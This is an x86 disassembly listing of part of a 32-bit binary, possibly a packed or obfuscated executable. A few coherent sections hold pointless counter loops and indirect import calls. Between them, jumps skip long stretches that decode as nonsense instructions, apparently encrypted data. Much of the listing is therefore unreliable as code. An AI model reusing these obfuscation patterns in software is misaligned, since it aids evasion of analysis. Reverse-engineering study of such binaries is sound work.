  40d6df:	xor    eax,0x6b40358c
  40d6e4:	mov    ecx,0x8d1dd79b
  40d6e9:	ret    0xb4e9
  40d6ec:	dec    edx
  40d6ed:	aad    0x8a
  40d6ef:	xchg   ebp,eax
  40d6f0:	inc    ebp
  40d6f1:	outs   dx,BYTE PTR ds:[esi]
  40d6f2:	fstp   TBYTE PTR [edx]
  40d6f4:	rcr    BYTE PTR [esp+edi*8],cl
  40d6f7:	test   bh,bh
  40d6f9:	mov    eax,ds:0x4573b9
  40d6fe:	add    BYTE PTR [ebx],al
  40d700:	shl    edi,1
  40d702:	(bad)  
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43431d,0x432cde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434311,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432cca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432cca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432cca,ecx
  40d749:	cmp    DWORD PTR ds:0x432cca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432cca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432b72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434286,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434286
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434286,ecx
  40d78a:	cmp    DWORD PTR ds:0x434286,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4327db
  40d79c:	push   0x43277d
  40d7a1:	call   DWORD PTR ds:0x4328f6
  40d7a7:	cmp    DWORD PTR ds:0x434286,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434286
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434286,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434286,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434296,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434296
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434296,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434296,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434296,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4328fa
  40d813:	cmp    DWORD PTR ds:0x434296,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434296
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434296,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432ce2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432604,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0xb1
  40d85b:	scas   al,BYTE PTR es:[edi]
  40d85c:	pusha  
  40d85d:	das    
  40d85e:	push   edi
  40d85f:	mov    dh,BYTE PTR [eax+0x70]
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8ae
  40d867:	leave  
  40d868:	pusha  
  40d869:	in     al,0xa2
  40d86b:	xchg   ecx,eax
  40d86c:	rcl    ebx,cl
  40d86e:	mov    ecx,0xbeb757df
  40d873:	and    ebp,DWORD PTR [eax]
  40d875:	pusha  
  40d876:	push   esp
  40d877:	push   DWORD PTR [edx-0x72]
  40d87a:	ja     0x40d871
  40d87c:	pop    edi
  40d87d:	rcl    BYTE PTR [edi],cl
  40d87f:	in     eax,dx
  40d880:	(bad)  
  40d881:	(bad)  
  40d882:	cwde   
  40d883:	and    BYTE PTR ss:[ebp-0x1d],ah
  40d887:	mov    ah,0x85
  40d889:	xchg   esp,eax
  40d88a:	div    BYTE PTR [edx]
  40d88c:	div    BYTE PTR [edx+0x222ad4cc]
  40d892:	and    bl,ah
  40d894:	les    ebx,FWORD PTR [ebx+0x106a4f3a]
  40d89a:	fcmove st,st(5)
  40d89c:	cmp    al,0x8b
  40d89e:	out    dx,al
  40d89f:	jo     0x40d916
  40d8a1:	mov    ch,0x58
  40d8a3:	ins    BYTE PTR es:[edi],dx
  40d8a4:	dec    ecx
  40d8a5:	cmp    al,0x2f
  40d8a7:	add    eax,edx
  40d8a9:	scas   eax,DWORD PTR es:[edi]
  40d8aa:	jg     0x40d91f
  40d8ac:	push   ebx
  40d8ad:	shl    bl,1
  40d8af:	jle    0x40d85a
  40d8b1:	sti    
  40d8b2:	rol    DWORD PTR [eax+esi*4+0x369529a5],0x13
  40d8ba:	adc    al,0xa8
  40d8bc:	or     bl,BYTE PTR [eax]
  40d8be:	lea    edx,ss:[esi-0x259a6780]
  40d8c5:	jno    0x40d939
  40d8c7:	ds mov cl,0xaa
  40d8ca:	push   ebx
  40d8cb:	mov    ds,WORD PTR [ebx]
  40d8cd:	mov    ch,0x9e
  40d8cf:	or     eax,0x94ab644c
  40d8d4:	xor    al,0x26
  40d8d6:	into   
  40d8d7:	xchg   edi,eax
  40d8d8:	cli    
  40d8d9:	jle    0x40d905
  40d8db:	(bad)  
  40d8dc:	xchg   edx,esp
  40d8de:	(bad)  
  40d8df:	mov    cl,0x44
  40d8e1:	xor    eax,0xcb62bfc4
  40d8e6:	call   0xc3db6f8f
  40d8eb:	frstor [edi]
  40d8ed:	sbb    al,0xb1
  40d8ef:	pop    ebp
  40d8f0:	xor    eax,0x351a1606
  40d8f5:	call   0x3ae32178
  40d8fa:	(bad)  
  40d8fb:	int3   
  40d8fc:	cs cli 
  40d8fe:	sbb    eax,0xe44aff53
  40d903:	jmp    0xc52cb44e
  40d908:	fild   QWORD PTR [eax+0x5001591]
  40d90e:	cwde   
  40d90f:	clc    
  40d910:	or     bl,BYTE PTR [esi]
  40d912:	and    eax,0x3de7a2a7
  40d917:	test   BYTE PTR [edx],ah
  40d919:	inc    ecx
  40d91a:	iret   
  40d91b:	(bad)  
  40d91c:	aam    0xd4
  40d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91f:	fidiv  DWORD PTR [edx+eiz*2]
  40d922:	and    eax,0x23a0dd0d
  40d927:	rol    BYTE PTR [edx-0xc],1
  40d92a:	ficomp DWORD PTR [edi]
  40d92c:	inc    edx
  40d92d:	nop
  40d92e:	cmp    BYTE PTR gs:[eax],dl
  40d931:	mov    ds:0xd045b1a9,eax
  40d936:	ja     0x40d913
  40d938:	in     eax,0x3f
  40d93a:	jbe    0x40d8d2
  40d93c:	or     al,0xee
  40d93e:	sub    ebp,DWORD PTR [ecx+edi*4-0x33]
  40d942:	stos   BYTE PTR es:[edi],al
  40d943:	sbb    BYTE PTR [edx+0x43b69157],0x6
  40d94a:	mov    al,0xbe
  40d94c:	mov    ch,0xf6
  40d94e:	add    DWORD PTR [ebp+esi*1+0x2ea315c0],ebx
  40d955:	sub    DWORD PTR [ecx+0x1d],edx
  40d958:	sti    
  40d959:	and    eax,0xfb7f566b
  40d95e:	loop   0x40d989
  40d960:	pop    eax
  40d961:	adc    al,0x77
  40d963:	sbb    ch,ah
  40d965:	dec    ecx
  40d966:	push   ss
  40d967:	popa   
  40d968:	stc    
  40d969:	jecxz  0x40d923
  40d96b:	js     0x40d964
  40d96d:	pop    ecx
  40d96e:	or     edi,eax
  40d970:	and    ecx,DWORD PTR [edx+0x5c]
  40d973:	add    al,0x31
  40d975:	js     0x40d9d1
  40d977:	add    BYTE PTR [eax-0x79],dl
  40d97a:	test   eax,0xe46afbca
  40d97f:	hlt    
  40d980:	jp     0x40d99d
  40d982:	das    
  40d983:	fdiv   QWORD PTR [esp+ecx*1-0x4057a835]
  40d98a:	popf   
  40d98b:	cmp    eax,0xdfcb2fcc
  40d990:	or     al,0x67
  40d992:	js     0x40d93d
  40d994:	mov    ds:0x229289ef,al
  40d999:	fdivrp st(5),st
  40d99b:	sub    al,0xf1
  40d99d:	shr    DWORD PTR [ebx],0x1d
  40d9a0:	pop    ebp
  40d9a1:	dec    BYTE PTR [edi]
  40d9a3:	fucomip st,st(4)
  40d9a5:	cmp    esp,DWORD PTR [edi]
  40d9a7:	dec    esi
  40d9a8:	mov    bl,0x8a
  40d9aa:	and    DWORD PTR [edi+esi*4+0x68404d78],ebp
  40d9b1:	sub    dl,BYTE PTR [ecx+eax*2+0x1f1fff6a]
  40d9b8:	mov    ds:0xb4ef2591,eax
  40d9bd:	in     al,0xa8
  40d9bf:	pop    ss
  40d9c0:	jmp    0x40d9c8
  40d9c2:	ds pusha 
  40d9c4:	jecxz  0x40d9b1
  40d9c6:	outs   dx,DWORD PTR ds:[esi]
  40d9c7:	mov    al,ds:0x81b635b3
  40d9cc:	inc    ebp
  40d9cd:	inc    ecx
  40d9cf:	inc    ebx
  40d9d0:	adc    al,0x24
  40d9d2:	mov    esi,0xe265ae9a
  40d9d7:	(bad)  
  40d9d8:	ficom  DWORD PTR [ebx-0x5e782ef3]
  40d9de:	mov    eax,0x8a5dd4b
  40d9e3:	lea    esi,[ecx]
  40d9e5:	mov    edi,0x4dfd5574
  40d9ea:	jg     0x40d9b5
  40d9ec:	retf   0xf3fd
  40d9ef:	and    al,0x2b
  40d9f1:	fmul   DWORD PTR [edx-0x1c]
  40d9f4:	inc    edx
  40d9f5:	xchg   ebx,eax
  40d9f6:	mov    dh,0x84
  40d9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f9:	jo     0x40d995
  40d9fb:	stos   DWORD PTR es:[edi],eax
  40d9fc:	shl    DWORD PTR [eax],1
  40d9fe:	xor    ch,BYTE PTR [edi+0x1f041043]
  40da04:	push   ebp
  40da05:	push   esp
  40da06:	sbb    ch,BYTE PTR [edx-0x65]
  40da09:	clc    
  40da0a:	aas    
  40da0b:	adc    al,0xf9
  40da0d:	or     ecx,DWORD PTR ds:[edi-0x65]
  40da11:	imul   eax,DWORD PTR [bx+si-0x76],0x32
  40da16:	xchg   edi,eax
  40da17:	shr    bh,cl
  40da19:	jno    0x40da82
  40da1b:	xchg   ebp,eax
  40da1c:	int3   
  40da1d:	inc    ecx
  40da1e:	sub    dl,dh
  40da20:	cmc    
  40da21:	jmp    0xb21fc5f9
  40da26:	add    ecx,DWORD PTR [eax-0x37da72dc]
  40da2c:	dec    eax
  40da2d:	xchg   edx,eax
  40da2e:	out    0x8c,al
  40da30:	xchg   ebp,eax
  40da31:	das    
  40da32:	nop
  40da33:	punpcklbw mm1,DWORD PTR [eax]
  40da36:	push   cs
  40da37:	pop    esp
  40da38:	mov    edi,0x5fc8c406
  40da3d:	ret    
  40da3e:	jmp    0x32d9ade6
  40da43:	ficomp DWORD PTR [ecx-0x6c]
  40da46:	push   esi
  40da47:	sbb    al,0x14
  40da49:	mov    ecx,0xac82edbd
  40da4e:	arpl   WORD PTR ds:0x47c62539,bx
  40da54:	jl     0x40dad3
  40da56:	ret    0x399a
  40da59:	dec    esi
  40da5a:	enter  0x3dff,0xdc
  40da5e:	leave  
  40da5f:	mov    ds:0x481cb730,al
  40da64:	or     ecx,ebp
  40da66:	push   esi
  40da67:	jns    0x40da31
  40da69:	or     eax,0xabec3c0e
  40da6e:	jb     0x40dac7
  40da70:	pop    ecx
  40da71:	pop    esp
  40da72:	sub    DWORD PTR [eax+0xe448d05],ecx
  40da78:	loop   0x40dad4
  40da7a:	and    eax,0x5385c2e6
  40da7f:	les    esp,FWORD PTR [edi+0x3f72db36]
  40da85:	out    0xd,eax
  40da87:	pop    edi
  40da88:	mov    al,ds:0x84eae169
  40da8d:	pop    ecx
  40da8e:	cwde   
  40da8f:	fld    st(1)
  40da91:	mov    ds,WORD PTR [ebx-0x14]
  40da94:	sti    
  40da95:	mov    eax,0x67cf9d47
  40da9a:	fild   QWORD PTR [eax]
  40da9c:	jp     0x40daeb
  40da9e:	cmp    eax,0x7a8c16be
  40daa3:	call   0x1e693e4f
  40daa8:	scas   al,BYTE PTR es:[edi]
  40daa9:	aam    0xc8
  40daab:	stos   DWORD PTR es:[edi],eax
  40daac:	add    DWORD PTR [ebx],esp
  40daae:	push   cs
  40daaf:	or     ebx,edi
  40dab1:	cwde   
  40dab2:	pop    ebx
  40dab3:	bound  ecx,QWORD PTR [edi]
  40dab5:	dec    ebx
  40dab6:	jmp    0x8da2:0x133ca9b0
  40dabd:	dec    eax
  40dabe:	pop    ecx
  40dabf:	ins    BYTE PTR es:[edi],dx
  40dac0:	arpl   WORD PTR [edi],dx
  40dac2:	push   cs
  40dac3:	jp     0x40db1b
  40dac5:	add    al,0xfd
  40dac7:	lsl    esp,ax
  40daca:	mov    eax,ds:0xa1f3a017
  40dacf:	jle    0x40da91
  40dad1:	xchg   ecx,eax
  40dad2:	dec    ecx
  40dad3:	xchg   ebx,eax
  40dad4:	jmp    0xe3c5:0x89ca0708
  40dadb:	push   ebp
  40dadc:	cmp    bl,BYTE PTR [edx]
  40dade:	pop    ebp
  40dadf:	(bad)  
  40dae0:	repnz and DWORD PTR [edi+0x9],esi
  40dae4:	fistp  QWORD PTR [esi]
  40dae6:	outs   dx,BYTE PTR ds:[esi]
  40dae7:	jge    0x40db63
  40dae9:	popa   
  40daea:	dec    esp
  40daeb:	idiv   eax
  40daed:	in     eax,0x11
  40daef:	mov    esp,0x603e40fd
  40daf4:	inc    ecx
  40daf5:	in     al,0xa7
  40daf7:	cmp    edx,DWORD PTR [esi+0xf]
  40dafa:	sub    DWORD PTR [esi-0x6947535a],edi
  40db00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db01:	sub    ch,BYTE PTR [ebp-0x4f42f8ac]
  40db07:	mov    bl,0xbf
  40db09:	js     0x40da8d
  40db0b:	sub    al,0xc2
  40db0d:	pop    ebp
  40db0e:	ror    ch,1
  40db10:	test   al,0xe1
  40db12:	jmp    FWORD PTR [edi-0x11]
  40db15:	addr16 call 0x5e1e:0xa9fc7130
  40db1d:	xor    DWORD PTR [esi+0x27],edi
  40db20:	jns    0x40daff
  40db22:	fptan  
  40db24:	jo     0x40db0b
  40db26:	mov    edi,0xcc53d011
  40db2b:	xchg   edx,eax
  40db2c:	loopne 0x40daff
  40db2e:	(bad)  
  40db2f:	ret    0x5fc8
  40db32:	imul   ebx,DWORD PTR [edx],0xe0d72b26
  40db38:	lea    esi,[ecx]
  40db3a:	enter  0x8439,0xba
  40db3e:	daa    
  40db3f:	in     al,dx
  40db40:	mov    bh,0x3
  40db42:	cmc    
  40db43:	fisttp DWORD PTR [esi]
  40db45:	dec    esi
  40db46:	mov    dl,BYTE PTR [eax-0x2]
  40db49:	fxch   st(4)
  40db4b:	call   FWORD PTR [bp+si+0x7207]
  40db50:	ds cmp al,0xe3
  40db53:	rol    DWORD PTR [ebx+edi*4+0xb],0xf2
  40db58:	mov    eax,ebx
  40db5a:	sub    DWORD PTR [esi+0x253e59c8],esp
  40db60:	(bad)  
  40db61:	sub    al,0xf9
  40db63:	ins    DWORD PTR es:[edi],dx
  40db64:	loope  0x40db94
  40db66:	enter  0x7e65,0xb1
  40db6a:	mov    dh,0xb1
  40db6c:	and    al,0x41
  40db6e:	jns    0x40dbe0
  40db70:	shl    ecx,0x97
  40db73:	stos   DWORD PTR es:[edi],eax
  40db74:	mov    dh,0x24
  40db76:	jmp    0xa819:0x402d3fde
  40db7d:	push   ecx
  40db7e:	and    eax,0x6cf61f7a
  40db83:	pop    ebx
  40db84:	pusha  
  40db85:	in     al,0x5e
  40db87:	xor    eax,0x558260b8
  40db8c:	and    al,0x38
  40db8e:	or     ch,BYTE PTR [eax]
  40db90:	fsubrp st(6),st
  40db92:	push   edi
  40db93:	and    bl,BYTE PTR [esi-0x54]
  40db96:	push   edi
  40db97:	and    eax,0xb4764802
  40db9c:	add    DWORD PTR [ebp-0x60],ecx
  40db9f:	mov    DWORD PTR ds:0x638ce957,esi
  40dba5:	cs mov cl,0x42
  40dba8:	pop    edi
  40dba9:	cs sub eax,0x38d54880
  40dbaf:	jns    0x40db91
  40dbb1:	jne    0x40dc23
  40dbb3:	sub    eax,0x113ddfa1
  40dbb8:	push   ebx
  40dbb9:	jg     0x40dc0a
  40dbbb:	sbb    edi,DWORD PTR [edi]
  40dbbd:	imul   eax,ebp,0xffffffb2
  40dbc0:	push   esp
  40dbc1:	fwait
  40dbc2:	in     eax,0xda
  40dbc4:	dec    eax
  40dbc5:	into   
  40dbc6:	sbb    ah,BYTE PTR [edx-0x4f49e2ff]
  40dbcc:	and    eax,0x75eaff5c
  40dbd1:	adc    ecx,DWORD PTR [eax+0x8]
  40dbd4:	pushf  
  40dbd5:	sbb    bl,BYTE PTR [ecx-0x80]
  40dbd8:	jecxz  0x40dbd7
  40dbda:	out    dx,al
  40dbdb:	inc    ecx
  40dbdc:	fstp   QWORD PTR [ebx]
  40dbde:	lds    esp,FWORD PTR [edx-0x35]
  40dbe1:	add    al,0x1e
  40dbe3:	clc    
  40dbe4:	push   edi
  40dbe5:	mov    al,0xc2
  40dbe7:	jo     0x40dc43
  40dbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbea:	(bad)  
  40dbeb:	dec    ebp
  40dbec:	test   eax,0xeaf28c38
  40dbf1:	pop    ebp
  40dbf2:	je     0x40dc16
  40dbf4:	add    eax,0x48d3ebf7
  40dbf9:	pushf  
  40dbfa:	dec    ecx
  40dbfb:	push   edx
  40dbfc:	sub    al,0x8e
  40dbfe:	adc    DWORD PTR [esp+esi*8-0x10b26554],edx
  40dc05:	push   esp
  40dc06:	dec    eax
  40dc07:	jge    0x40dc61
  40dc09:	xchg   edx,eax
  40dc0a:	xor    BYTE PTR [edi+0x2703a12e],ch
  40dc10:	sub    eax,0x7fe122de
  40dc15:	xchg   esi,eax
  40dc16:	data16 fbstp TBYTE PTR [edx+0x6bd42f0f]
  40dc1d:	push   0x7abd83da
  40dc22:	es mov esi,0x225d65
  40dc28:	and    eax,0xf14a7f32
  40dc2d:	push   ecx
  40dc2e:	mov    ds,WORD PTR [esi]
  40dc30:	add    ebp,edx
  40dc32:	int    0x62
  40dc34:	fmul   st(5),st
  40dc36:	adc    eax,0x43e194e4
  40dc3b:	je     0x40dbe3
  40dc3d:	mov    DWORD PTR [ebp-0x8],esi
  40dc40:	mov    ecx,DWORD PTR ds:0x43429a
  40dc46:	and    DWORD PTR ds:0x432cc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4325f8,0x434311
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dcc5
  40dc6d:	call   0x96e1001b
  40dc72:	jo     0x40dce4
  40dc74:	dec    ecx
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dce2
  40dc79:	add    dh,cl
  40dc7b:	arpl   WORD PTR [ebx+0x57],bx
  40dc7e:	or     al,0x1b
  40dc80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc81:	push   ebx
  40dc82:	aaa    
  40dc83:	in     eax,dx
  40dc84:	lods   al,BYTE PTR ds:[esi]
  40dc85:	ds pop ecx
  40dc87:	int    0x0
  40dc89:	inc    ebp
  40dc8a:	jbe    0x40dcf1
  40dc8c:	ret    
  40dc8d:	call   0x3e23:0xf9eef2fc
  40dc94:	jae    0x40dd0e
  40dc96:	adc    esi,esp
  40dc98:	add    BYTE PTR [esp+edx*4+0x67],bl
  40dc9c:	test   ecx,eax
  40dc9e:	pop    ebx
  40dc9f:	xor    dh,0xd1
  40dca2:	stos   DWORD PTR es:[edi],eax
  40dca3:	fwait
  40dca4:	xor    al,0x37
  40dca6:	addr16 mov bl,bl
  40dca9:	pop    edx
  40dcaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcab:	push   eax
  40dcac:	sub    eax,0xbea777da
  40dcb1:	sbb    al,0x98
  40dcb3:	xchg   esp,eax
  40dcb4:	cmc    
  40dcb5:	call   0x4777:0x1a8d5c2c
  40dcbc:	test   al,0x9d
  40dcbe:	frstor [eax-0x5b]
  40dcc1:	call   0x1446:0x7f8cdb4c
  40dcc8:	(bad)  
  40dcc9:	xchg   DWORD PTR [esp+ebx*4-0x4f],esi
  40dccd:	push   ss
  40dcce:	ins    DWORD PTR es:[edi],dx
  40dccf:	les    ecx,FWORD PTR [edi-0x79]
  40dcd2:	add    eax,DWORD PTR [ecx+0x1d]
  40dcd5:	das    
  40dcd6:	adc    ecx,DWORD PTR [ebx+ebx*1+0x3c8584ef]
  40dcdd:	sub    eax,DWORD PTR [ebp+eax*4-0x56859644]
  40dce4:	or     edi,DWORD PTR [eax-0x218f8041]
  40dcea:	addr16 loopne 0x40dcc9
  40dced:	add    BYTE PTR [esi],ah
  40dcef:	mov    ecx,0x4e37e30b
  40dcf4:	retf   
  40dcf5:	cmp    DWORD PTR [ebx],ebp
  40dcf7:	sub    eax,0x4cc72aae
  40dcfc:	cdq    
  40dcfd:	xchg   ebx,eax
  40dcfe:	xor    BYTE PTR [ebx+0x56],cl
  40dd01:	xor    eax,0x2a495e1d
  40dd06:	inc    edx
  40dd07:	jmp    0x6717:0x77645727
  40dd0e:	(bad)  
  40dd0f:	push   esi
  40dd10:	dec    ebp
  40dd11:	dec    ebx
  40dd12:	cmc    
  40dd13:	fldcw  WORD PTR [esi+edi*1+0x71]
  40dd17:	bound  edi,QWORD PTR ds:0xe94ee241
  40dd1d:	mov    ds:0xc3ba711,al
  40dd22:	call   0x15755ea5
  40dd27:	mov    cl,0x81
  40dd29:	xor    al,0xc4
  40dd2b:	mov    esi,DWORD PTR [ebx+0x72f4a6a9]
  40dd31:	and    WORD PTR [edx+eax*1+0x3a96b1af],dx
  40dd39:	ret    0x9d2
  40dd3c:	in     eax,0xd
  40dd3e:	mov    al,ds:0xfe716248
  40dd43:	mov    ecx,0xcdd38325
  40dd48:	or     DWORD PTR [ebp-0x2df71bd8],ebx
  40dd4e:	lock and eax,0xf6d8f8b1
  40dd54:	push   ebp
  40dd55:	pop    ss
  40dd56:	mov    DWORD PTR [eax+0x7d1fc9e5],ecx
  40dd5c:	pop    ebp
  40dd5d:	mov    dh,0x2c
  40dd5f:	out    0xd2,al
  40dd61:	je     0x40dd02
  40dd63:	jns    0x40dcfa
  40dd65:	ret    0xe7a2
  40dd68:	scas   al,BYTE PTR es:[edi]
  40dd69:	jge    0x40ddd5
  40dd6b:	bound  edi,QWORD PTR [esi-0x7369cd46]
  40dd71:	clc    
  40dd72:	loopne 0x40dd61
  40dd74:	mov    ch,0xe
  40dd76:	int    0x38
  40dd78:	sbb    BYTE PTR [eax-0x51c59a40],cl
  40dd7e:	mov    al,ds:0x339cfe3c
  40dd83:	gs adc bh,al
  40dd86:	xchg   esi,eax
  40dd87:	push   0xb2eb5c64
  40dd8c:	idiv   ecx
  40dd8e:	sub    DWORD PTR [ebp-0x3dd4d686],ebx
  40dd94:	add    eax,ecx
  40dd96:	stos   BYTE PTR es:[edi],al
  40dd97:	in     al,0x39
  40dd99:	scas   eax,DWORD PTR es:[edi]
  40dd9a:	sahf   
  40dd9b:	fwait
  40dd9c:	push   ss
  40dd9d:	test   DWORD PTR [esi+eax*4],0xdc15481e
  40dda4:	test   al,0xe4
  40dda6:	xchg   DWORD PTR [eax-0x43],ebx
  40dda9:	daa    
  40ddaa:	fild   WORD PTR [edi+0x3651d7c0]
  40ddb0:	jae    0x40dda3
  40ddb2:	add    eax,0x13377dee
  40ddb7:	push   esi
  40ddb8:	adc    DWORD PTR [ebx-0x33],edx
  40ddbb:	pop    eax
  40ddbc:	xchg   ecx,eax
  40ddbd:	jae    0x40de2c
  40ddbf:	mov    ds:0x50af7ce1,eax
  40ddc4:	(bad)  
  40ddc5:	(bad)  
  40ddc6:	sbb    cl,ah
  40ddc8:	pop    edx
  40ddc9:	sub    bl,BYTE PTR [eax]
  40ddcb:	sahf   
  40ddcc:	lea    edi,[eax-0x64]
  40ddcf:	mov    bh,0x17
  40ddd1:	jns    0x40dd9a
  40ddd3:	in     al,dx
  40ddd4:	mov    cl,0x40
  40ddd6:	xchg   ebx,eax
  40ddd7:	loopne 0x40dd5a
  40ddd9:	add    ebx,ebx
  40dddb:	lds    edi,FWORD PTR [edi+0x6ab9acce]
  40dde1:	sbb    al,0x91
  40dde3:	sub    BYTE PTR [ebp+ecx*8+0x45dac909],al
  40ddea:	jae    0x40de4f
  40ddec:	fadd   DWORD PTR [ecx+eax*1-0xb]
  40ddf0:	mov    edx,0xbad77029
  40ddf5:	ss push esp
  40ddf7:	call   0x1bae2940
  40ddfc:	xor    al,0xe8
  40ddfe:	xchg   esp,edx
  40de00:	sbb    BYTE PTR [ecx],bh
  40de02:	enter  0x9d4a,0x0
  40de06:	cdq    
  40de07:	ret    
  40de08:	scas   al,BYTE PTR es:[edi]
  40de09:	aas    
  40de0a:	mov    al,ds:0xdc626531
  40de0f:	cs dec ebp
  40de11:	add    esp,eax
  40de13:	fiadd  WORD PTR [ebx+0x10]
  40de16:	neg    dl
  40de18:	xchg   edi,eax
  40de19:	xlat   BYTE PTR ds:[ebx]
  40de1a:	iret   
  40de1b:	into   
  40de1c:	mov    ecx,0x92b80255
  40de21:	aas    
  40de22:	in     al,0xf0
  40de24:	rcl    edx,cl
  40de26:	xchg   DWORD PTR [ebx+0x7d],edx
  40de29:	inc    ebx
  40de2a:	retf   
  40de2b:	pop    ss
  40de2c:	push   edx
  40de2d:	lock sbb BYTE PTR ds:0xd92bf545,dl
  40de34:	mov    dh,0x4f
  40de36:	ja     0x40de24
  40de38:	js     0x40ddf8
  40de3a:	or     eax,0x3ab47ad1
  40de3f:	stos   BYTE PTR es:[edi],al
  40de40:	mov    dl,0xce
  40de42:	adc    DWORD PTR [esp+ecx*1],ebp
  40de45:	sbb    eax,0x22ace882
  40de4a:	cdq    
  40de4b:	ss mov esi,0x89feda53
  40de51:	and    BYTE PTR [ebp+0x5e],cl
  40de54:	sub    DWORD PTR [esi+0x2d52c7be],ebp
  40de5a:	jo     0x40dea9
  40de5c:	popa   
  40de5d:	fbld   TBYTE PTR [esp+eax*2]
  40de60:	jle    0x40de26
  40de62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de63:	cmp    al,0x55
  40de65:	js     0x40de8d
  40de67:	xor    BYTE PTR [eax+0x7ee03be5],bh
  40de6d:	sub    esp,DWORD PTR cs:[ecx+0x10]
  40de71:	mov    esi,0xe74a234b
  40de76:	dec    ebp
  40de77:	and    BYTE PTR ds:0x4d298b05,0x65
  40de7e:	sbb    ch,BYTE PTR [eax+ebx*8+0x4052dd20]
  40de85:	xor    al,0xee
  40de87:	retf   0x3eda
  40de8a:	push   edx
  40de8b:	mov    al,0x15
  40de8d:	imul   edx,DWORD PTR [edi-0x52],0xac5934cd
  40de94:	iret   
  40de95:	cwde   
  40de96:	add    al,0x77
  40de98:	xor    cl,BYTE PTR [edi+eax*2-0x80]
  40de9c:	mov    esp,0x1066e0a6
  40dea1:	or     DWORD PTR [ecx-0x2c],0x14
  40dea5:	jl     0x40deab
  40dea7:	add    al,0x3d
  40dea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40deaa:	pop    ecx
  40deab:	popf   
  40deac:	push   es
  40dead:	int3   
  40deae:	fdiv   QWORD PTR [eax]
  40deb0:	loope  0x40de6c
  40deb2:	ret    0xf976
  40deb5:	dec    edi
  40deb6:	sub    eax,0xf82edba3
  40debb:	leave  
  40debc:	mov    bl,0xc0
  40debe:	dec    eax
  40debf:	push   ebp
  40dec0:	(bad)  [ebp+0x46f8a5e5]
  40dec6:	mov    ebx,0x803d304e
  40decb:	or     bh,ch
  40decd:	fwait
  40dece:	jb     0x40df4c
  40ded0:	loopne 0x40df29
  40ded2:	test   eax,0xa2c2b57c
  40ded7:	mov    esp,0xaaa8235b
  40dedc:	arpl   WORD PTR ds:0x6adb9345,bx
  40dee2:	test   DWORD PTR [ecx],0x9d2a4444
  40dee8:	push   esi
  40dee9:	dec    ebp
  40deea:	daa    
  40deeb:	es push ebp
  40deed:	sub    al,0x5c
  40deef:	fdivr  DWORD PTR [ecx-0x117a8566]
  40def5:	mov    ss,WORD PTR [esi+0x1d7def9a]
  40defb:	out    dx,eax
  40defc:	xchg   ecx,eax
  40defd:	ffreep st(1)
  40deff:	into   
  40df00:	and    DWORD PTR [edx+esi*2+0x1],edi
  40df04:	add    eax,0x45ec0806
  40df09:	pop    edx
  40df0a:	test   eax,edx
  40df0c:	das    
  40df0d:	sub    ebx,DWORD PTR cs:[ecx]
  40df10:	dec    ebx
  40df11:	dec    esi
  40df12:	sbb    DWORD PTR [edi],edx
  40df14:	and    eax,0xa00b415a
  40df19:	xchg   esi,ecx
  40df1b:	push   DWORD PTR [ecx+eiz*2]
  40df1e:	repnz icebp 
  40df20:	push   cs
  40df21:	je     0x40defb
  40df23:	ret    
  40df24:	add    BYTE PTR [ecx],bl
  40df26:	adc    al,0xdc
  40df28:	dec    ebp
